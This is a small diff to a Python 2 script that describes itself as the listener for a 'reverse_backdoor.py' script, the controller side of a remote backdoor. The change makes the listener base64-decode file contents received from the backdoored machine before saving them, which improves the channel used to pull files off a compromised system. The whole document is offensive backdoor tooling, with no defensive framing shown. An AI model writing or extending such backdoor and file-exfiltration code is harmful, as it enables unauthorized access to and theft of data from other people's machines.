@@ -2,6 +2,7 @@
 # NOTICE: This script is used as a listener for 'reverse_backdoor.py' script.
 # Compatibility: Python 2 only. For now.
 
+import base64
 import json
 import socket
 
@@ -39,7 +40,7 @@ class Listener:
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
-            file.write(content)
+            file.write(base64.b64decode(content))
             return "[+] Download successful."
 
     def run(self):
